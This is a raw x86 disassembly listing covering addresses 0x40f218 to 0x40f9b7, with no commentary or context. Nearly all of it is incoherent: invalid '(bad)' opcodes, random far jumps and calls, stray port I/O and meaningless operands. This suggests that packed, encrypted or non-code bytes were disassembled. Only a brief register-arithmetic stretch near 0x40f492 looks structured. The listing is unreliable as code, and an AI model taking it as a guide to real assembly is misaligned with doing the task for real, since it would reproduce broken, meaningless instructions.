  40f218:	jno    0x40f234
  40f21a:	cmp    BYTE PTR [ebx+0x1d60cbd4],cl
  40f220:	xor    DWORD PTR [esi],esi
  40f222:	data16 jge 0x40f20e
  40f225:	mov    es,WORD PTR [esp+edi*4+0x24]
  40f229:	cmp    eax,DWORD PTR [edx+0x62]
  40f22c:	fild   QWORD PTR ds:0x89e119
  40f232:	inc    ecx
  40f233:	sub    al,BYTE PTR [ebx]
  40f235:	(bad)  
  40f236:	fist   WORD PTR [ecx]
  40f238:	dec    edx
  40f239:	inc    esi
  40f23a:	inc    ebp
  40f23b:	mov    ss,WORD PTR [esi]
  40f23d:	mov    ecx,0x6f56e617
  40f242:	ret    0x6928
  40f245:	inc    edx
  40f246:	sahf   
  40f247:	or     BYTE PTR [ebp-0x72],bh
  40f24a:	inc    esi
  40f24b:	retf   0xdbf5
  40f24e:	mov    bh,0x67
  40f250:	aaa    
  40f251:	repz dec edi
  40f253:	stc    
  40f254:	sub    al,0xe1
  40f256:	ins    BYTE PTR es:[edi],dx
  40f257:	jae    0x40f1fb
  40f259:	(bad)  
  40f25a:	inc    esp
  40f25b:	mov    ebp,DWORD PTR [edi-0x2b49fbd1]
  40f261:	mov    BYTE PTR [ecx+0x79],dl
  40f264:	loop   0x40f2c4
  40f266:	fcom   DWORD PTR ds:0x4b638a1d
  40f26c:	sbb    eax,0x623d0642
  40f271:	lods   eax,DWORD PTR ds:[esi]
  40f272:	out    dx,eax
  40f273:	push   es
  40f274:	jp     0x40f211
  40f276:	xchg   ecx,eax
  40f277:	pop    es
  40f278:	mov    dl,0x7e
  40f27a:	popa   
  40f27b:	mov    esi,0xb3a6c2dd
  40f280:	jg     0x40f2c6
  40f282:	push   0xb6c60bc
  40f287:	adc    ecx,DWORD PTR [ebp+0x61]
  40f28a:	jmp    0x40f287
  40f28c:	add    edi,DWORD PTR [ebp-0x4117108f]
  40f292:	pop    esp
  40f293:	fld    QWORD PTR [edi+edi*1]
  40f296:	cmp    esi,edx
  40f298:	pop    ss
  40f299:	outs   dx,DWORD PTR ds:[esi]
  40f29a:	mov    cl,0xcb
  40f29c:	sbb    esi,esi
  40f29e:	call   0x6fa3ad6b
  40f2a3:	ret    0xc8d3
  40f2a6:	push   esp
  40f2a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2a8:	not    BYTE PTR [eax]
  40f2aa:	push   edi
  40f2ab:	mov    DWORD PTR [esi],esi
  40f2ad:	jge    0x40f2ac
  40f2af:	or     ebx,ecx
  40f2b1:	sahf   
  40f2b2:	mov    edi,0xd78ab531
  40f2b7:	push   edi
  40f2b8:	cmp    al,0xd4
  40f2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2bb:	adc    al,dl
  40f2bd:	push   ecx
  40f2be:	bound  ebp,QWORD PTR [edi+0x57]
  40f2c1:	(bad)
  40f2c4:	hlt    
  40f2c5:	add    BYTE PTR [edi-0xd1b978b],0x3e
  40f2cc:	mov    bh,0xfd
  40f2ce:	mov    ds:0x9c62fd62,eax
  40f2d3:	cmp    DWORD PTR [eax],esp
  40f2d5:	pop    ebp
  40f2d6:	test   BYTE PTR [edi+edx*1+0x2600c35b],bh
  40f2dd:	into   
  40f2de:	mov    al,0x75
  40f2e0:	xor    BYTE PTR [ecx+0x75],bh
  40f2e3:	or     eax,0x2c10f5ad
  40f2e8:	mov    al,ds:0x8bddf9a4
  40f2ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2ee:	scas   eax,DWORD PTR es:[edi]
  40f2ef:	xor    al,0x57
  40f2f1:	pop    esp
  40f2f2:	sar    BYTE PTR [ecx+0x3f9e6256],cl
  40f2f8:	enter  0xacef,0x73
  40f2fc:	fnstsw WORD PTR [edi+0x23]
  40f2ff:	add    BYTE PTR [esi],cl
  40f301:	je     0x40f353
  40f303:	sub    eax,0x71c6920
  40f308:	inc    ecx
  40f309:	jmp    0xe0cb:0xb5fde7c0
  40f310:	outs   dx,DWORD PTR ds:[esi]
  40f311:	cmc    
  40f312:	ins    DWORD PTR es:[edi],dx
  40f313:	jo     0x40f344
  40f315:	pop    es
  40f316:	add    BYTE PTR [edx+0x71],dh
  40f319:	xor    al,0xaf
  40f31b:	mov    al,0x68
  40f31d:	ror    edx,1
  40f31f:	mov    edx,0x916ca235
  40f324:	push   es
  40f325:	jle    0x40f335
  40f327:	jnp    0x40f2ad
  40f329:	pushf  
  40f32a:	jp     0x40f2ce
  40f32c:	fs push 0x24ec6a3
  40f332:	fs aaa 
  40f334:	adc    eax,0xbd7fd60e
  40f339:	inc    eax
  40f33a:	dec    edx
  40f33b:	xchg   esi,eax
  40f33c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f33d:	ret    0x86b0
  40f340:	xor    DWORD PTR [eax+0x70],esp
  40f343:	das    
  40f344:	mov    dh,0x7a
  40f346:	mov    cs,WORD PTR [eax]
  40f348:	das    
  40f349:	or     eax,0xbc1ccc07
  40f34e:	push   ecx
  40f34f:	es idiv esi
  40f352:	or     BYTE PTR [ebx],0x3d
  40f355:	ret    0x75e9
  40f358:	loop   0x40f31d
  40f35a:	mov    ah,BYTE PTR [ecx-0x21]
  40f35d:	xor    eax,0xb1ffb74
  40f362:	adc    al,0x29
  40f364:	pop    eax
  40f365:	mov    edx,0xf61dbc51
  40f36a:	inc    eax
  40f36b:	and    eax,0x304f7ba7
  40f370:	leave  
  40f371:	or     bh,BYTE PTR [eax+0x1d]
  40f374:	imul   edx,DWORD PTR [ebx+eax*4+0x1a],0x7c
  40f379:	test   eax,0x4de5887d
  40f37e:	les    ax,DWORD PTR [esp+ebx*2-0x292d137d]
  40f386:	rcr    DWORD PTR [eax+0x55],1
  40f389:	fcom   DWORD PTR [esi]
  40f38b:	push   0x6d
  40f38d:	nop
  40f38e:	(bad)  
  40f391:	gs loope 0x40f3c8
  40f394:	jle    0x40f3e2
  40f396:	add    dh,dl
  40f398:	mov    ds:0x866f78c1,eax
  40f39d:	pusha  
  40f39e:	inc    ebx
  40f39f:	repnz cmp al,0xe7
  40f3a2:	in     eax,0x59
  40f3a4:	jno    0x40f3fd
  40f3a6:	hlt    
  40f3a7:	ja     0x40f3c8
  40f3a9:	lods   al,BYTE PTR ds:[esi]
  40f3aa:	jl     0x40f3f6
  40f3ac:	ja     0x40f3f9
  40f3ae:	popf   
  40f3af:	lods   al,BYTE PTR ds:[esi]
  40f3b0:	into   
  40f3b1:	jp     0x40f3b3
  40f3b3:	cld    
  40f3b4:	scas   eax,DWORD PTR es:[edi]
  40f3b5:	jb     0x40f39f
  40f3b7:	cmp    BYTE PTR ds:0x78784a36,al
  40f3bd:	or     BYTE PTR [ecx+0x5bca746c],dh
  40f3c3:	xor    ebx,esp
  40f3c5:	mov    bl,0xfc
  40f3c7:	inc    edi
  40f3c8:	mov    ebx,0xeab62737
  40f3cd:	(bad)  
  40f3cf:	fcomp  DWORD PTR [ecx+0x72]
  40f3d2:	stos   BYTE PTR es:[edi],al
  40f3d3:	fdiv   DWORD PTR [ebx+0x71b1fc8]
  40f3d9:	mov    si,0x5798
  40f3dd:	push   ds
  40f3de:	cs stos BYTE PTR es:[edi],al
  40f3e0:	or     eax,0x84b4a386
  40f3e5:	dec    esi
  40f3e6:	xor    DWORD PTR [ebp+0x6f],eax
  40f3e9:	scas   al,BYTE PTR es:[edi]
  40f3ea:	lock fisub DWORD PTR cs:[edi+0x3225fdff]
  40f3f2:	popf   
  40f3f3:	add    al,0x6b
  40f3f5:	xor    DWORD PTR [eax+ebx*1-0x11a4ae9],esp
  40f3fc:	cli    
  40f3fd:	outs   dx,DWORD PTR ds:[esi]
  40f3fe:	dec    ebx
  40f3ff:	cmp    DWORD PTR [ebp+0x42d7b76e],esp
  40f405:	and    ebp,esi
  40f407:	lods   eax,DWORD PTR ds:[esi]
  40f408:	dec    eax
  40f409:	(bad)
  40f40c:	xor    al,0xae
  40f40e:	ret    
  40f40f:	outs   dx,DWORD PTR ds:[esi]
  40f410:	shr    DWORD PTR [ebp+edi*4-0x44],cl
  40f414:	dec    edx
  40f415:	xlat   BYTE PTR ds:[ebx]
  40f416:	xor    bl,BYTE PTR [ecx]
  40f418:	shr    DWORD PTR [edx+0x27bbb634],cl
  40f41e:	in     al,0x70
  40f420:	sub    DWORD PTR [edx],0xaa629757
  40f426:	in     eax,dx
  40f427:	mov    al,ds:0x2ce05907
  40f42c:	mov    ecx,?
  40f42e:	xchg   esp,eax
  40f42f:	push   edx
  40f430:	ss cwde 
  40f432:	jecxz  0x40f423
  40f434:	(bad)  
  40f435:	push   esi
  40f436:	mov    edi,0xc3364172
  40f43b:	shl    BYTE PTR [ebp-0x38e14279],cl
  40f441:	inc    ebp
  40f442:	clc    
  40f443:	test   al,0xba
  40f445:	jae    0x40f490
  40f447:	cmc    
  40f448:	pop    esp
  40f449:	sub    DWORD PTR [eax+0x179db682],ebx
  40f44f:	dec    esp
  40f450:	cwde   
  40f451:	neg    DWORD PTR [eax]
  40f453:	test   dl,ch
  40f455:	shl    DWORD PTR [ebx-0x53cd140],0xbd
  40f45c:	outs   dx,BYTE PTR ds:[esi]
  40f45d:	jbe    0x40f3e1
  40f45f:	push   ss
  40f460:	xchg   DWORD PTR ds:0x88049ebf,edx
  40f466:	adc    edx,edi
  40f468:	out    dx,eax
  40f469:	aas    
  40f46a:	sub    DWORD PTR [ebx-0x729be132],esp
  40f470:	stc    
  40f471:	aad    0x6f
  40f473:	mov    bh,0x80
  40f475:	icebp  
  40f476:	jl     0x40f4be
  40f478:	sbb    al,BYTE PTR [ebp-0x47]
  40f47b:	jl     0x40f4c7
  40f47d:	aaa    
  40f47e:	jg     0x40f476
  40f480:	xor    al,0x48
  40f482:	test   DWORD PTR [edx-0x41],ebp
  40f485:	sbb    DWORD PTR [eax+0x7faa3bea],edi
  40f48b:	dec    ebp
  40f48c:	push   ebp
  40f48d:	add    eax,0x3f0f5b92
  40f492:	mov    eax,0x8b128bc2
  40f497:	xor    eax,0x421ce2
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421ce2
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	or     ebx,ebx
  40f4c6:	fidiv  DWORD PTR [esi]
  40f4c8:	dec    ebx
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx-0x6d]
  40f4d1:	jmp    0xfc8d:0x839d92ae
  40f4d8:	mov    ebx,0xa0dbfae6
  40f4dd:	aad    0x89
  40f4df:	rcr    DWORD PTR [edx+0xe],1
  40f4e2:	loop   0x40f4e1
  40f4e4:	mov    edx,0x7f8ee6b4
  40f4e9:	ins    DWORD PTR es:[edi],dx
  40f4ea:	adc    ch,BYTE PTR [edi-0x4f]
  40f4ed:	fidivr DWORD PTR ds:0xf0ed5860
  40f4f3:	fstp   DWORD PTR [edi]
  40f4f5:	mov    ch,0xff
  40f4f7:	pop    edi
  40f4f8:	out    dx,al
  40f4f9:	(bad)  
  40f4fa:	shl    dl,1
  40f4fc:	xchg   ebx,eax
  40f4fd:	pop    ds
  40f4fe:	dec    esp
  40f4ff:	mov    ah,0xbb
  40f501:	mov    ebx,ebx
  40f503:	pushf  
  40f504:	jl     0x40f567
  40f506:	and    al,0x7f
  40f508:	push   cs
  40f509:	fwait
  40f50a:	xchg   ah,dl
  40f50c:	inc    ebp
  40f50d:	and    BYTE PTR [edi],0x8a
  40f510:	mov    ecx,0x3853e780
  40f515:	or     al,0x8c
  40f517:	pop    ebx
  40f518:	lods   al,BYTE PTR ds:[esi]
  40f519:	mov    al,0xa0
  40f51b:	out    0x16,al
  40f51d:	xchg   edi,eax
  40f51e:	inc    edx
  40f51f:	imul   eax,DWORD PTR [ecx],0xffffff8a
  40f522:	call   0x30a4:0x93e5df61
  40f529:	cmp    al,0xa7
  40f52b:	mov    ebp,0x36678e69
  40f530:	sub    al,0x28
  40f532:	push   esp
  40f533:	retf   
  40f534:	int    0x26
  40f536:	sub    DWORD PTR ds:0x661a0489,0x3d
  40f53d:	push   ds
  40f53e:	(bad)  
  40f53f:	aas    
  40f540:	je     0x40f5b3
  40f542:	add    dl,BYTE PTR [edx-0x4a104d36]
  40f548:	pop    edi
  40f549:	lahf   
  40f54a:	dec    ecx
  40f54b:	xchg   ebp,eax
  40f54c:	repnz scas eax,DWORD PTR es:[edi]
  40f54e:	ins    BYTE PTR es:[edi],dx
  40f54f:	dec    esi
  40f550:	jnp    0x40f591
  40f552:	add    eax,0xf63e5b92
  40f557:	or     eax,0x81613817
  40f55c:	mov    eax,ds:0xc67e048d
  40f561:	je     0x40f4fe
  40f563:	in     al,dx
  40f564:	add    BYTE PTR [ecx+eax*1],al
  40f567:	into   
  40f568:	add    ch,BYTE PTR [esi-0x3f87dbe3]
  40f56e:	std    
  40f56f:	jb     0x40f55a
  40f571:	dec    edi
  40f572:	test   BYTE PTR [eax],bh
  40f574:	ja     0x40f557
  40f576:	mov    ebp,0x43e418cf
  40f57b:	arpl   WORD PTR [ecx+0x55f83cb6],ax
  40f581:	daa    
  40f582:	xor    dl,ah
  40f584:	push   edi
  40f585:	lods   al,BYTE PTR ds:[esi]
  40f586:	mov    ds:0x6451d18a,eax
  40f58b:	xchg   esi,eax
  40f58c:	bound  edi,QWORD PTR [edi]
  40f58e:	cmp    eax,0x8c63b761
  40f593:	ins    DWORD PTR es:[edi],dx
  40f594:	mov    ds:0xc6afd85c,eax
  40f599:	mov    dl,0x6f
  40f59b:	and    ebp,edi
  40f59d:	out    dx,al
  40f59e:	in     al,dx
  40f59f:	mov    ah,0x94
  40f5a1:	popf   
  40f5a2:	mov    bh,0x7b
  40f5a4:	imul   ebx,DWORD PTR ds:0x2adfd257,0xffffffff
  40f5ab:	and    edx,DWORD PTR [ecx+0x5494062a]
  40f5b1:	data16 (bad) 
  40f5b4:	fwait
  40f5b5:	adc    esp,DWORD PTR [esi-0x50fb58a]
  40f5bb:	jmp    0x428f99bc
  40f5c0:	das    
  40f5c1:	mov    edi,0x3775aeda
  40f5c6:	inc    esi
  40f5c7:	outs   dx,DWORD PTR ds:[esi]
  40f5c8:	jmp    0x2ee41d31
  40f5cd:	or     ch,cl
  40f5cf:	lods   al,BYTE PTR ds:[esi]
  40f5d0:	dec    edx
  40f5d1:	xchg   ecx,eax
  40f5d2:	dec    ebp
  40f5d3:	stc    
  40f5d4:	fsubr  DWORD PTR [ecx]
  40f5d6:	fsubr  QWORD PTR ds:0xa648ea61
  40f5dc:	mov    WORD PTR [edx+0x4a],?
  40f5df:	pop    ss
  40f5e0:	cdq    
  40f5e1:	fstp   QWORD PTR [edi]
  40f5e3:	ret    0x8f65
  40f5e6:	and    DWORD PTR [ecx+0x7bcd1ea6],edx
  40f5ec:	mov    eax,0x1c96c86e
  40f5f1:	fs inc edx
  40f5f3:	mov    esp,0x9d66458
  40f5f8:	push   0x41058a88
  40f5fd:	pop    ebp
  40f5fe:	inc    DWORD PTR [edi]
  40f600:	ss stos BYTE PTR es:[edi],al
  40f602:	test   BYTE PTR [esi],dl
  40f604:	stc    
  40f605:	push   0xe3899f0f
  40f60a:	fimul  DWORD PTR [edx-0x52]
  40f60d:	xchg   ebx,eax
  40f60e:	adc    BYTE PTR [edx*1-0x11c0dc67],bh
  40f615:	inc    ebx
  40f616:	mov    al,dl
  40f618:	lea    edx,[esi+0x66ffc915]
  40f61e:	and    al,0xea
  40f620:	out    0xe2,al
  40f622:	ret    0x1fb
  40f625:	dec    eax
  40f626:	push   eax
  40f627:	test   al,0x3b
  40f629:	cs pushf 
  40f62b:	xor    al,0x1c
  40f62d:	loope  0x40f61c
  40f62f:	and    al,al
  40f631:	mov    ebx,0x291bfd3f
  40f636:	dec    edi
  40f637:	in     eax,0x2a
  40f639:	scas   eax,DWORD PTR es:[edi]
  40f63a:	sub    eax,0x391cd778
  40f63f:	ss adc edi,esi
  40f642:	lock pop ss
  40f644:	test   BYTE PTR [esi+0x12],bh
  40f647:	fs mov edi,0xa56bafb8
  40f64d:	ret    
  40f64e:	shl    DWORD PTR [ecx+ebx*8-0x7c2f7523],0x73
  40f656:	scas   eax,DWORD PTR es:[edi]
  40f657:	pop    ecx
  40f658:	ret    0xa053
  40f65b:	push   ecx
  40f65c:	pop    es
  40f65d:	ins    DWORD PTR es:[edi],dx
  40f65e:	and    al,BYTE PTR [edi]
  40f660:	jecxz  0x40f653
  40f662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f663:	aaa    
  40f664:	test   eax,0xad826a90
  40f669:	das    
  40f66a:	adc    BYTE PTR ds:0x6a841c24,ah
  40f670:	popf   
  40f671:	out    dx,al
  40f672:	arpl   WORD PTR [ebp+0x46],si
  40f675:	pop    ebp
  40f676:	dec    ebp
  40f677:	or     al,0xaa
  40f679:	out    0x9d,eax
  40f67b:	jl     0x40f6ca
  40f67d:	mov    ch,0x75
  40f67f:	out    dx,al
  40f680:	adc    eax,0x90010db3
  40f685:	sub    DWORD PTR [edx+0x59],0xc41fd1b2
  40f68c:	jecxz  0x40f6a0
  40f68e:	std    
  40f68f:	pop    edi
  40f690:	(bad)  
  40f691:	out    dx,al
  40f692:	cmp    edi,DWORD PTR [ebx+ebp*8-0x395059d7]
  40f699:	xor    cl,bh
  40f69b:	gs (bad) 
  40f69d:	out    dx,eax
  40f69e:	(bad)  [ebp+0x3f]
  40f6a1:	rcl    BYTE PTR [ecx-0x10],1
  40f6a4:	xor    DWORD PTR [edi-0x5f],ecx
  40f6a7:	aam    0xb
  40f6a9:	das    
  40f6aa:	pop    ss
  40f6ab:	popa   
  40f6ac:	push   es
  40f6ad:	jno    0x40f640
  40f6af:	inc    ebx
  40f6b0:	pop    ecx
  40f6b1:	int3   
  40f6b2:	mov    dh,0x1e
  40f6b4:	mov    esi,0x11216dcb
  40f6b9:	jne    0x40f64a
  40f6bb:	fs inc esi
  40f6bd:	repnz or ecx,edx
  40f6c0:	jmp    esp
  40f6c2:	ss inc esp
  40f6c4:	bound  esp,QWORD PTR [edx+0x6b01333c]
  40f6ca:	test   BYTE PTR [edx],cl
  40f6cc:	enter  0x3b1d,0x52
  40f6d0:	sar    DWORD PTR [esp+esi*8],1
  40f6d3:	adc    ecx,DWORD PTR [esi+0x3e]
  40f6d6:	pop    ss
  40f6d7:	sub    bl,BYTE PTR ds:0xcacba74f
  40f6dd:	outs   dx,BYTE PTR ds:[esi]
  40f6de:	call   0xf95e68ed
  40f6e3:	mov    bh,0x6f
  40f6e5:	ins    BYTE PTR es:[edi],dx
  40f6e6:	mov    ecx,esi
  40f6e8:	inc    ebx
  40f6e9:	div    BYTE PTR [ebp-0x51ecfb90]
  40f6ef:	loopne 0x40f6bd
  40f6f1:	lock (bad) 
  40f6f4:	mov    al,BYTE PTR [ebx+0x15ffc66c]
  40f6fa:	fdiv   QWORD PTR [edx]
  40f6fc:	push   edi
  40f6fd:	cmp    eax,DWORD PTR [eax]
  40f6ff:	arpl   sp,cx
  40f701:	clc    
  40f702:	sbb    eax,0x4ad57852
  40f707:	mov    eax,esp
  40f709:	pusha  
  40f70a:	and    cl,BYTE PTR [ecx+0x25]
  40f70d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f70e:	cli    
  40f70f:	dec    ecx
  40f710:	fmul   st(5),st
  40f712:	push   esp
  40f713:	call   0x300:0x3fba8023
  40f71a:	and    DWORD PTR [ecx+0x3d],esp
  40f71d:	lods   eax,DWORD PTR ds:[esi]
  40f71e:	cdq    
  40f71f:	ss push 0xffffff88
  40f722:	cdq    
  40f723:	mov    ebx,0x4f3ae6f3
  40f728:	jnp    0x40f7a2
  40f72a:	popf   
  40f72b:	mov    ds:0x26006d26,al
  40f730:	aaa    
  40f731:	sbb    eax,0xf5d11e35
  40f736:	sbb    al,0xb5
  40f738:	pop    ecx
  40f739:	loop   0x40f6bf
  40f73b:	sbb    bl,BYTE PTR [esi+0x6e11988e]
  40f741:	lahf   
  40f742:	retf   
  40f743:	pop    edx
  40f744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f745:	in     eax,dx
  40f746:	sbb    ebp,DWORD PTR [ecx+0x6526e829]
  40f74c:	jg     0x40f74c
  40f74e:	and    ebx,ecx
  40f750:	push   cs
  40f751:	sbb    BYTE PTR [eax+0x47f6e05f],ch
  40f757:	adc    esp,DWORD PTR [ecx+ecx*8+0xb]
  40f75b:	cmp    ebp,DWORD PTR [edi-0x399c82af]
  40f761:	and    eax,0x9eed8a4a
  40f766:	push   ds
  40f767:	push   es
  40f768:	jbe    0x40f7b0
  40f76a:	loope  0x40f7b4
  40f76c:	xor    al,0x28
  40f76f:	loop   0x40f6f9
  40f771:	mov    esi,0x9fc305dd
  40f776:	popf   
  40f777:	mov    ds:0xe630bd0,eax
  40f77c:	(bad)
  40f77f:	and    al,0x3f
  40f781:	dec    esi
  40f782:	inc    ebp
  40f783:	ror    BYTE PTR [eax-0x145e5bd1],cl
  40f789:	and    BYTE PTR [eax-0x33],al
  40f78c:	cs call 0x569e877a
  40f792:	js     0x40f75f
  40f794:	or     DWORD PTR [edx-0x2c],0x41
  40f798:	add    BYTE PTR [eax],dh
  40f79a:	cld    
  40f79b:	jmp    0x40f81a
  40f79d:	aad    0x37
  40f79f:	adc    esp,DWORD PTR [ebx-0x366a715]
  40f7a5:	outs   dx,BYTE PTR ds:[esi]
  40f7a6:	mov    al,0x4a
  40f7a8:	jo     0x40f815
  40f7aa:	inc    ecx
  40f7ab:	stc    
  40f7ac:	mov    ch,0xa7
  40f7ae:	es cmc 
  40f7b0:	rcl    DWORD PTR [esi-0x26cb92da],1
  40f7b6:	mov    ah,0x9e
  40f7b8:	dec    eax
  40f7b9:	adc    ah,BYTE PTR [ebp-0x4f59bee9]
  40f7bf:	xchg   ecx,eax
  40f7c0:	push   0xffffffe4
  40f7c2:	rol    DWORD PTR [ecx-0x321732cd],1
  40f7c8:	mov    ebp,0xb57f0926
  40f7cd:	retf   0xe67b
  40f7d0:	popf   
  40f7d1:	imul   edi,ebx,0x3e
  40f7d4:	dec    ecx
  40f7d5:	int3   
  40f7d6:	xchg   ebp,eax
  40f7d7:	sub    eax,0x248f71e9
  40f7dc:	scas   al,BYTE PTR es:[edi]
  40f7dd:	push   esp
  40f7de:	inc    edi
  40f7df:	cwde   
  40f7e0:	ret    0x734
  40f7e3:	cmp    BYTE PTR [esi+0x48],dh
  40f7e6:	jg     0x40f844
  40f7e8:	rol    BYTE PTR [ebp-0x379abfa3],0x60
  40f7ef:	mov    al,0x56
  40f7f1:	add    esp,esi
  40f7f3:	das    
  40f7f4:	mov    esi,0x85ee1db8
  40f7f9:	jns    0x40f83c
  40f7fb:	cmp    DWORD PTR [edx+0x609eebe3],0x66
  40f802:	call   0x3f3690df
  40f807:	and    al,0x9c
  40f809:	cmc    
  40f80a:	imul   BYTE PTR [edx-0x2397034f]
  40f810:	and    eax,0x7148bb9d
  40f815:	stc    
  40f816:	push   ss
  40f817:	daa    
  40f818:	pop    esi
  40f819:	in     al,dx
  40f81a:	or     DWORD PTR [ebx+0x54],0x16
  40f81e:	int3   
  40f81f:	scas   al,BYTE PTR es:[edi]
  40f820:	fcomi  st,st(0)
  40f822:	rcr    DWORD PTR [ecx-0x7f5134eb],cl
  40f828:	mov    bl,bh
  40f82a:	inc    esi
  40f82b:	jns    0x40f87d
  40f82d:	inc    ecx
  40f82e:	outs   dx,DWORD PTR ds:[esi]
  40f82f:	cmp    bh,BYTE PTR [ebx]
  40f831:	pop    es
  40f832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f833:	cmp    DWORD PTR [eax-0x11],0x309a6ad1
  40f83a:	test   eax,0x63b350aa
  40f83f:	inc    esp
  40f840:	les    edi,FWORD PTR [ebx-0x50]
  40f843:	out    dx,al
  40f844:	pop    ebx
  40f845:	push   es
  40f846:	dec    ebx
  40f847:	(bad)  
  40f848:	sbb    eax,0x1e63f47c
  40f84d:	mov    bh,0x9
  40f84f:	push   esi
  40f850:	adc    DWORD PTR [edx+0x1f],edx
  40f853:	mov    WORD PTR [ebx-0x21],fs
  40f856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f857:	stc    
  40f858:	inc    esp
  40f859:	sbb    DWORD PTR [eax+edx*4-0x531e08dd],ebx
  40f860:	rcl    DWORD PTR [edx-0x4fc41575],0x39
  40f867:	mov    ebp,0x678cb2d5
  40f86c:	test   ax,0x9013
  40f870:	xchg   edi,eax
  40f871:	sbb    cl,cl
  40f873:	ins    BYTE PTR es:[edi],dx
  40f874:	mov    ds:0xba0bf74e,eax
  40f879:	mov    esi,0xf3eee4cf
  40f87e:	or     dh,bl
  40f880:	mov    ebx,0x86491bde
  40f885:	add    edx,DWORD PTR [edx+0x7212618c]
  40f88b:	add    BYTE PTR [edi+0x67d430d1],ah
  40f891:	std    
  40f892:	and    BYTE PTR [ecx],dl
  40f894:	mov    eax,0xacab1bf9
  40f899:	adc    DWORD PTR [ecx],ebx
  40f89b:	xchg   esp,eax
  40f89c:	jns    0x40f898
  40f89e:	dec    esp
  40f89f:	cmp    eax,0x2860818a
  40f8a4:	mov    edx,0xa86bab42
  40f8a9:	jl     0x40f8cd
  40f8ab:	enter  0x44c4,0x76
  40f8af:	mov    ds:0x8d4acd21,eax
  40f8b4:	push   ecx
  40f8b5:	leave  
  40f8b6:	add    al,0x9f
  40f8b8:	mov    edx,0xeaa856cc
  40f8bd:	retf   
  40f8be:	xor    edx,DWORD PTR [edx+0x9]
  40f8c1:	jae    0x40f883
  40f8c3:	xchg   BYTE PTR [ecx-0x6ca6e776],al
  40f8c9:	mov    ebx,0xbc184a00
  40f8ce:	push   0xfb8b3bc8
  40f8d3:	sub    eax,0xac5d2807
  40f8d8:	and    BYTE PTR [ebp+0x4c33d64f],cl
  40f8de:	mov    ebx,DWORD PTR [ebx+0x7e070da2]
  40f8e4:	inc    ebp
  40f8e5:	add    BYTE PTR [ebp+ebx*2-0x42],dl
  40f8e9:	push   esi
  40f8ea:	ss enter 0x4423,0xb7
  40f8ef:	push   esp
  40f8f0:	inc    ebp
  40f8f1:	mov    ebx,0x2ea7d817
  40f8f6:	xor    bl,BYTE PTR [eax]
  40f8f8:	and    dh,0xb3
  40f8fb:	(bad)  
  40f8fd:	sbb    DWORD PTR ds:0x76684335,ebx
  40f903:	and    BYTE PTR [ecx-0x27],al
  40f906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f907:	cmp    DWORD PTR [edi],0x3b719755
  40f90d:	in     al,0xf1
  40f90f:	sub    BYTE PTR [ecx-0xd],dh
  40f912:	mov    ebx,0x27043976
  40f917:	adc    cl,bh
  40f919:	xor    eax,0x3199987c
  40f91e:	sbb    ecx,eax
  40f920:	je     0x40f958
  40f922:	leave  
  40f923:	icebp  
  40f924:	sbb    dh,BYTE PTR [ecx+eax*8+0x5]
  40f928:	mov    BYTE PTR [esi-0x6e],ch
  40f92b:	(bad)  [ecx-0x61241459]
  40f931:	and    bl,BYTE PTR [edi]
  40f933:	xchg   DWORD PTR [edi+ebx*4-0x73a954f],ebp
  40f93a:	xor    esp,eax
  40f93c:	push   0x2b49757f
  40f941:	mov    eax,ds:0xffbc6e2f
  40f946:	sbb    bh,BYTE PTR [ecx+0x1]
  40f949:	lea    esi,[ebx]
  40f94b:	or     DWORD PTR [ecx-0xe],esp
  40f94e:	inc    edx
  40f94f:	imul   BYTE PTR [ecx+0x601b6273]
  40f955:	iret   
  40f956:	mov    bh,0xae
  40f958:	in     eax,0xc0
  40f95a:	xor    DWORD PTR [eax+0x1f],ebp
  40f95d:	cmp    al,BYTE PTR [edi-0x38]
  40f960:	mov    ebp,0xe508764f
  40f965:	outs   dx,BYTE PTR ds:[esi]
  40f966:	pop    esi
  40f967:	add    dh,BYTE PTR [esi]
  40f969:	push   es
  40f96a:	ins    DWORD PTR es:[edi],dx
  40f96b:	fbstp  TBYTE PTR [ebx]
  40f96d:	leave  
  40f96e:	lea    edx,[ebp+0x60]
  40f971:	pushf  
  40f972:	enter  0x54b9,0xf5
  40f976:	xchg   edi,eax
  40f977:	cmc    
  40f978:	inc    esp
  40f979:	js     0x40f956
  40f97b:	ja     0x40f984
  40f97d:	fistp  QWORD PTR [edx-0x3d]
  40f980:	push   cs
  40f981:	mov    eax,0x453b4a53
  40f986:	mov    BYTE PTR [edi-0x1e03a7b1],al
  40f98c:	sahf   
  40f98d:	dec    esp
  40f98e:	fst    QWORD PTR [esi-0xf]
  40f991:	xchg   BYTE PTR [eax-0x67],ch
  40f994:	(bad)  
  40f995:	not    DWORD PTR [edx-0x628be63e]
  40f99b:	adc    BYTE PTR [esi-0x6c],cl
  40f99e:	mov    dh,0x5c
  40f9a0:	or     DWORD PTR [edi-0x3f],edi
  40f9a3:	mov    bh,0x32
  40f9a5:	push   ebp
  40f9a6:	iret   
  40f9a7:	popf   
  40f9a8:	jecxz  0x40f992
  40f9aa:	sbb    DWORD PTR [ecx],esi
  40f9ac:	hlt    
  40f9ad:	ja     0x40f99a
  40f9af:	(bad)  
  40f9b0:	cmp    eax,0x19928eff
  40f9b5:	jp     0x40f970
  40f9b7:	jmp    0x6ea2:0x5cbdfcf2
